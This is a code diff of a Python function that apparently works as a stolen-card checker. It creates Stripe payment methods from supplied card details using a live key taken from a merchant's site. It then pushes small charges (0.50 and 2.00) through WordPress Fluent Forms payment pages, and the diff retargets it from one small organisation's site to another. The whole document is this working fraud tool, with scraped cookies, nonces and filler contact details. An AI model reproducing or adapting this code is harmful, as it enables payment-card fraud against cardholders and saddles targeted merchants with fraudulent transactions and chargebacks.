@@ -26,32 +26,28 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51IVRriDPCt2tZCsX8E0VVtPadB8IgYZicwBLi7NavcohuncTtItPdiuY68MPdvJsaJ0n3KMJJc8WEgr9zFk23Xfk00fX0LtHvl'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51JUSsdLKcbiWYA2XlcI7cM8QwlOlTxhQz7CfoQZVR8EnFzSQGzCagg9Ox7JwOG0edKEiJf4xH47GI5A6gq9m1qo500bgDe2Jtl'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '5820386d-a056-4a87-8b68-c10de8fef2775eac40',
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_first_add': 'fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
-	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F',
-	    '__stripe_sid': 'a497d9ce-e488-439d-8a57-0aafbf1d3df4c87ccd',
+	    '_gid': 'GA1.2.428777829.1744539054',
+	    '_ga_4MZY34CRTP': 'GS1.1.1744539054.1.0.1744539054.0.0.0',
+	    '_ga': 'GA1.1.264961307.1744539054',
+	    '__stripe_mid': 'edc12a34-a5fe-41f7-8a09-b2822039c714bb49b0',
+	    '__stripe_sid': 'fe0769ae-fcbb-44f5-900d-f132b60bb11a521a8f',
 	}
 	
 	headers = {
-	    'authority': 'villagemusiccircles.com',
+	    'authority': 'dubaicme.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=5820386d-a056-4a87-8b68-c10de8fef2775eac40; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F; __stripe_sid=a497d9ce-e488-439d-8a57-0aafbf1d3df4c87ccd',
-	    'origin': 'https://villagemusiccircles.com',
-	    'referer': 'https://villagemusiccircles.com/global-facilitator-payment-form/',
+	    # 'cookie': '_gid=GA1.2.428777829.1744539054; _ga_4MZY34CRTP=GS1.1.1744539054.1.0.1744539054.0.0.0; _ga=GA1.1.264961307.1744539054; __stripe_mid=edc12a34-a5fe-41f7-8a09-b2822039c714bb49b0; __stripe_sid=fe0769ae-fcbb-44f5-900d-f132b60bb11a521a8f',
+	    'origin': 'https://dubaicme.com',
+	    'referer': 'https://dubaicme.com/ws-ehs2025/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -63,21 +59,15 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744510751220',
+	    't': '1744539195459',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=6796&_fluentform_3_fluentformnonce=c3482ab163&_wp_http_referer=%2Fglobal-facilitator-payment-form%2F&names_1%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&datetime=&email_3=rodamuser08%40gmail.com&phone_4=0817480671&country-list=&reason_for_payment_6%5B%5D=Other&input_text=Deposit&custom-payment-amount_1=0.50&payment_option_12=Pay%20by%20credit%20card&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=32383&_fluentform_81_fluentformnonce=520e088348&_wp_http_referer=%2Fws-ehs2025%2F&input_radio_2=Student%20&Registration_fee=300&dropdown=prof&input_text=Rodam%20User&email=rodamuser08%40gmail.com&phone_1=%2B16046438137&country-list=US&input_text_1=Help&input_text_3=NY&dropdown_1=Dubai&input_radio_1=Ultrasound%20Workshop%0D%0A&custom-payment-amount=2.00&payment_method=stripe&item__81__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '3',
+	    'form_id': '81',
 	}
 	
-	r2 = requests.post(
-	    'https://villagemusiccircles.com/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://dubaicme.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
